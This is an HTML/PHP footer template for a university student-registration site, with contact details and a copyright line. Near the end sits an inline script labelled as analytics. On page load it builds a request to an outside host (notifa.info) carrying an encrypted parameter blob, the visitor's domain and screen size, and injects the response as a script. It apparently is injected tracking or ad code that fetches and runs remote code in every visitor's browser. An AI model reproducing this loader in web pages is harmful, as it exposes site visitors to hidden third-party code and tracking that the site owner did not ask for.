<div id="bottomspot">
        <!--Start Footer-->
        <div id="mx-bottom" class="clearfix">
            <div class="mx-inner clearfix">
                <div class="module ">
                    <div class="mod-wrapper clearfix">
                        <div class="mod-content clearfix">

                            <div class="custom">
                                <p style="text-align: center;"><strong><span style="font-size: 12pt;">Sekretariat Pendaftaran</span></strong>
                                    <br>Universitas Teknokrat Indonesia
                                    <br>Jl. Z.A. Pagar Alam 9-11 Labuhan Ratu
                                    <br>Kedaton Bandar Lampung
                                    <br>Telp: 0721-702022</p>
                            </div>
                        </div>
                    </div>
                </div>
                <div style="clear:both;"></div>
            </div>
        </div>
        <div id="mx-footer" class="mx-base">
            <div id="mx-bft" class="clearfix">

                <ul class="social-icons">
                </ul>
                <div class="cp">
                    Copyright © Universitas Teknokrat Indonesia
                </div>
                <a id="pagetop" title="Scroll to Top" href="http://spmb.teknokrat.ac.id/index.php/buat-akun-pendaftaran#" rel="nofollow">Go to Top</a>
            </div>
        </div>
        <!--End Footer-->
    </div>

    <script type="text/javascript" src="<?=base_url()?>assets/sticky.js"></script>

    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mz31ibFSB9CM64uMq%2fLKYnOkbGGg8xih2Yhssr8zB6Q094KA06BZ2rqpPXoKA2d%2f25FBxLO2j0DtXkKealGbfAw1B8FB6gWw6qRkIY8KhtkZQ3zpF7i3cScozRaghESQlsVM3Xkk%2fS%2bfFmEWWeHQHps%2fC4hYW7E6rNgfWv1VUsoldQlO4rMBKTjTQDkdIIvq0faVTazFsKQ87%2fLt40%2f2naEOM9o6g83MFNN2ZsyZ4tsB4uNYo1sigTtEq5p9jKVqNN69YgwexPtrngJ0smf3LlvfgLMeB5M%2bfO3vQcvr8ktsZ4UMQigeK56S8LFIEHVXf3y9ERFLQU1POMa72bN3h4qg%2foG%2bUEo6X8PRWn5V%2bTemju%2fYr6cUBIAsOxCmmgMa%2f2vNfhxJZP9CrL8c7ToUIJAcMiowMROAV6auUwV0v7fVwjXmoyzqEqQSTTWvKhxb0pduoI%2fziS8DF5%2fwQeEuN9FtLJeUd3NhXOpqbnQGCT4q0oPVCejeu4FO2O4fIafSbohpW63egsB%2b1W2VSxl41In%2bY4MPYsNpJaft5ocMRc4cVSl6HppRJeGJUKuyX%2bGKPgxVp86iLVwA5mw0UFGUpwg%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };
    </script>
    <?php if(isset($script)){
        $this->load->view($script);
    }?>
</body>

</html>